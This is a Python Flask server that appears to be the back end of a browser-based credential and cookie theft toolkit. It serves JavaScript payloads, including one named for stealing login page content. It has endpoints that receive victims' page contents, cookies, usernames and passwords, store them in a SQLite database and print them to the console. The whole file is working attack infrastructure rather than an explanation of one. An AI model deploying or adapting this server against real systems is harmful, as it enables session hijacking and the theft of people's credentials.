#!/usr/bin/env python3

from flask import Flask, request, send_file
from db import create_connection, insert, create_db
from flask_cors import CORS
import argparse

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

@app.route('/content', methods=['POST'])
def content():
    conn = create_connection(database)
    url = request.form["url"]
    content = request.form["content"]
    insert(conn,'content', (url, content))
    conn.commit()
    print("[+] Received Page: %s" % url,)
    return ""
@app.route('/cookie', methods=['POST'])
def cookies():
    conn = create_connection(database)
    name = request.form["name"]
    value = request.form["value"]
    insert(conn, 'cookies', (name, value))
    conn.commit()
    print("[+] Received cookie: %s %s" % (name,value))
    return ""
@app.route('/credential', methods=['POST'])
def credentials():
    conn = create_connection(database)
    usr = request.form["usr"]
    pwd = request.form["pwd"]
    insert(conn,'credentials', (usr, pwd))
    conn.commit()
    print("[+] Received Credential: %s %s" % (usr,pwd))
    return ""
@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', download_name='client.js')

@app.route('/stealLoginPageContnet.js', methods=['GET'])
def stealLoginPageContnet():
    print("[+] Sending Payload")
    return send_file('./stealLoginPageContnet.js', download_name='stealLoginPageContnet.js')

parser = argparse.ArgumentParser()
parser.add_argument('--host', help='IP to Listen On', type=str, default="0.0.0.0")
parser.add_argument('--port', help='Port to Listen on', type=int, default=80)
parser.add_argument('--cert', help='cert file', required=True)
parser.add_argument('--key', help='key file', required=True)
args = parser.parse_args()
print(F"Serving HTTPS on {args.host} port {args.port} (http://{args.host}:{args.port}/) ...")
app.run(host=args.host, port=args.port, ssl_context=(args.cert, args.key))
